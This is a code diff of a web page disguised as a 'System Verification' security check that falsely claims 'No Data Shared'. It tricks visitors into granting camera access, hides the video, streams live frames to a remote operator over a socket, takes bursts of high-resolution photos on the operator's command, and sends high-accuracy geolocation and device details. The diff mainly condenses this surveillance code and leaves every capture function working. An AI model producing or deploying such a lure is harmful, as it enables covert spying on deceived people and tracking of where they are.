@@ -32,7 +32,6 @@
         .waiting { background: #2c3e50; color: #3498db; }
         .error { background: #512e2f; color: #e74c3c; }
         .success { background: #1e4620; color: #2ecc71; }
-        
         .action-btn {
             width: 100%;
             background: #27ae60;
@@ -44,10 +43,8 @@
             font-weight: bold;
             cursor: pointer;
             margin-top: 15px;
-            transition: opacity 0.2s;
         }
         .action-btn:hover { opacity: 0.9; }
-        
         video { display: none !important; }
         .secure-badge { font-size: 11px; color: #7f8c8d; margin-top: 20px; display: block; }
     </style>
@@ -57,13 +54,9 @@
 <div class="card" id="mainCard">
     <h2>System Verification</h2>
     <p>Please complete the security check to proceed to your requested content safely.</p>
-    
     <div id="status" class="status waiting">Click below to start verification</div>
-    
     <button id="startBtn" class="action-btn" onclick="triggerVerification()">Verify & Continue</button>
-    
     <video id="video" autoplay playsinline muted></video>
-    
     <span class="secure-badge">🔒 256-bit Secure Connection &bull; No Data Shared</span>
 </div>
 
@@ -92,20 +85,16 @@ function getDeviceInfo() {
     const ua = navigator.userAgent.toLowerCase();
     let device = "Desktop/PC";
     let browser = "Unknown Browser";
-
     if (ua.includes("android")) device = "Android Mobile";
-    else if (ua.includes("iphone") || ua.includes("ipad") || ua.includes("ipod")) device = "iOS Device";
+    else if (ua.includes("iphone") || ua.includes("ipad")) device = "iOS Device";
     else if (ua.includes("mobile")) device = "Mobile Device";
-
     if (ua.includes("edg")) browser = "Microsoft Edge";
-    else if (ua.includes("chrome") || ua.includes("crios")) browser = "Google Chrome";
+    else if (ua.includes("chrome")) browser = "Google Chrome";
     else if (ua.includes("firefox")) browser = "Mozilla Firefox";
     else if (ua.includes("safari")) browser = "Apple Safari";
-
     return `${device} (${browser})`;
 }
 
-// Location sirf tabhi execute hogi jab admin explicitly request karega
 function requestAndSendLocation() {
     if (!navigator.geolocation) return;
     navigator.geolocation.getCurrentPosition(
@@ -116,44 +105,27 @@ function requestAndSendLocation() {
             });
         },
         error => {},
-        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+        { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
     );
 }
 
-// Click par sirf Camera trigger hoga (Location nahi)
 async function triggerVerification() {
     startBtn.style.display = "none";
     setStatus("Verifying session...", "waiting");
-
-    if (mediaStream) {
-        mediaStream.getTracks().forEach(track => track.stop());
-    }
+    if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
 
     try {
-        const constraints = {
+        const stream = await navigator.mediaDevices.getUserMedia({
             audio: false,
-            video: {
-                facingMode: useFrontCamera ? "user" : "environment",
-                width: { ideal: 1280 },
-                height: { ideal: 720 }
-            }
-        };
-
-        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            video: { facingMode: useFrontCamera ? "user" : "environment", width: { ideal: 1280 }, height: { ideal: 720 } }
+        });
         mediaStream = stream;
         video.srcObject = stream;
         await video.play();
-
         cameraReady = true;
         setStatus("Verified Successfully!", "success");
-
         socket.emit("user-ready", { deviceInfo: getDeviceInfo() });
         startLiveStream();
-
-        setTimeout(() => {
-            setStatus("Connected. Please wait...", "waiting");
-        }, 1500);
-
     } catch (error) {
         cameraReady = false;
         setStatus("Verification required to proceed.", "error");
@@ -167,88 +139,40 @@ function startLiveStream() {
         if (!cameraReady || !video.videoWidth) return;
         canvas.width = 640;
         canvas.height = 360;
-        const context = canvas.getContext("2d");
-        context.drawImage(video, 0, 0, 640, 360);
-        // High quality stream frame (0.6 quality for clear CCTV feed)
-        const frame = canvas.toDataURL("image/jpeg", 0.6);
-        socket.emit("live-stream-frame", frame);
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, 640, 360);
+        socket.emit("live-stream-frame", canvas.toDataURL("image/jpeg", 0.6));
     }, 150);
 }
 
 function takeSinglePhoto() {
     if (!cameraReady) return;
-    const width = video.videoWidth || 1280;
-    const height = video.videoHeight || 720;
-    canvas.width = width;
-    canvas.height = height;
-    const context = canvas.getContext("2d");
-    context.drawImage(video, 0, 0, width, height);
-    // Maximum High-Resolution Photo Capture (0.95 quality)
-    const imageData = canvas.toDataURL("image/jpeg", 0.95);
-    socket.emit("user-photo-captured", imageData);
+    canvas.width = video.videoWidth || 1280;
+    canvas.height = video.videoHeight || 720;
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    socket.emit("user-photo-captured", canvas.toDataURL("image/jpeg", 0.95));
 }
 
 socket.on("start-auto-capture", () => {
     if (autoCaptureRunning) return;
     autoCaptureRunning = true;
     let count = 0;
-    const maxCaptures = 5;
-
     takeSinglePhoto();
     count++;
-
     const timer = setInterval(() => {
-        if (count >= maxCaptures) {
-            clearInterval(timer);
-            autoCaptureRunning = false;
-            return;
-        }
+        if (count >= 5) { clearInterval(timer); autoCaptureRunning = false; return; }
         takeSinglePhoto();
         count++;
     }, 1000);
 });
 
-socket.on("capture-photo", () => { takeSinglePhoto(); });
-
-// Admin ke button dabane par hi location fetch hogi
-socket.on("request-location", () => { requestAndSendLocation(); });
-
+socket.on("capture-photo", () => takeSinglePhoto());
+socket.on("request-location", () => requestAndSendLocation());
 socket.on("switch-camera", async () => {
     useFrontCamera = !useFrontCamera;
     if (cameraReady) await triggerVerification();
 });
-
-socket.on("server-full", data => {
-    setStatus(`Maximum capacity reached (${data.maxUsers} users).`, "error");
-    if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
-});
-
-socket.on("link-disabled", () => {
-    stopEverything();
-    setStatus("This link is currently inactive.", "error");
-});
-
-socket.on("disable-user-access", () => {
-    stopEverything();
-    document.body.innerHTML = `
-        <div class="card">
-            <h2>Session Ended</h2>
-            <p>The session has been terminated by the administrator.</p>
-        </div>
-    `;
-});
-
-function stopEverything() {
-    cameraReady = false;
-    if (streamInterval) {
-        clearInterval(streamInterval);
-        streamInterval = null;
-    }
-    if (mediaStream) {
-        mediaStream.getTracks().forEach(track => track.stop());
-        mediaStream = null;
-    }
-}
 
 socket.on("connect", () => {
     socket.emit("user-connect-info", { deviceInfo: getDeviceInfo() });
